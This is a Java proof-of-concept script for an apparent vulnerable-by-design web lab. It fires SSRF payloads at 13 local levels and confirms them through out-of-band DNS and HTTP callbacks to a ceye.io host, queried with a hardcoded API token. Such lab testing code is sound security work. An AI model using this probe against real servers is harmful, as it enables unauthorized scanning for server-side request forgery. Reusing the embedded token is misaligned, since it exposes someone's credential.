package cn.bestsec.vulweb.poc;

import lombok.extern.slf4j.Slf4j;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.util.EntityUtils;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

import static cn.bestsec.vulweb.utils.HttpClientUtil.getConnection;
import static cn.bestsec.vulweb.utils.HttpClientUtil.getRequestMethod;

/**
 * @author hjxin
 * @since 2023/11/10
 * SSRF漏洞验证代码
 */
@Slf4j
public class SSRFPoc {
    public static void main(String[] args) throws IOException {
        String payloadHost = "n0moml.ceye.io";
        String baseUrl = "http://localhost:8080/ssrf/level%d?p=%s";
        HashMap<String, String> map = new HashMap<>();
        String randStr;
        String payloadUrl = "";
        String targetUrl = "";

        for(int i = 1;i<=13;i++){
            randStr = genRandomStr();
            payloadUrl = "http://" + randStr + "." + payloadHost;
            targetUrl = String.format(baseUrl, i, payloadUrl);
            if(i == 2){
                targetUrl = String.format("http://localhost:8080/ssrf/level%d?protocol=http&host=%s&file=", i, randStr + "." + payloadHost);
            }
            map.put(randStr, targetUrl);
            sendHttpRequest(targetUrl);
        }
        try {
            log.info("等待dns写入...");
            Thread.sleep(2000);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
        for(Map.Entry<String, String> entry: map.entrySet()){
            if(isVul(entry.getValue(), entry.getKey())){
                log.info("漏洞存在！");
            }else{
                log.info("漏洞不存在！");
            }
        }

    }

    public static void sendHttpRequest(String target) throws IOException {
        Map<String, String> map = new HashMap<String, String>();

        CloseableHttpClient client = getConnection();
        HttpUriRequest get = getRequestMethod(map, target, "get");
        HttpResponse response;
        String resposneCode = "";
        try{
            for(int count=0;count<=1;count++){
                response = client.execute(get);
                resposneCode = String.valueOf(response.getStatusLine().getStatusCode());
                EntityUtils.consumeQuietly(response.getEntity());
            }
        }catch(Exception e){
            log.error(e.toString());
        }finally {
            log.info(String.format("请求%s完成, status code: %s", target, resposneCode));
        }
    }

    public static boolean isVul(String target, String randStr) {
        // todo: 1. ceye.io 的api有一些记录就是获取不到，但是通过他的web页面可以查看到，这就导致部分ssrf漏洞漏报;
        // todo: 2. api.ceye.io 这个域名有时候会报 UnknownHostException
        log.info(target);
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
        String ceyeUrl = "http://api.ceye.io/v1/records?token=cbeab658a688b1ea9d02ab5cd93f71dd&type=%s&filter=%s";
        Map<String, String> map = new HashMap<String, String>();
        CloseableHttpClient client = getConnection();
        HttpUriRequest get;

        try {
            for(String type: new String[]{"dns", "request"}){
                String url = String.format(ceyeUrl, type, randStr);
                get = getRequestMethod(map, url, "get");
                HttpResponse ceyeResponse = client.execute(get);
                HttpEntity entity = ceyeResponse.getEntity();
                String entityStr = EntityUtils.toString(entity);
                if(ceyeResponse.getStatusLine().getStatusCode() == 200){
                    if(entityStr.contains("[{")){
                        return true;
                    }
                    log.info(entityStr);
                }else{
                    log.error("ceye故障，漏洞检测结果可能不准确！");
                }
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        return false;
    }

    public static String genRandomStr(){
        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random = new Random();
        StringBuilder randomStr = new StringBuilder();
        for(int index=0;index<=16;index++){
            int randInt = random.nextInt(61);
            randomStr.append(str.charAt(randInt));
        }
        return randomStr.toString();
    }
}
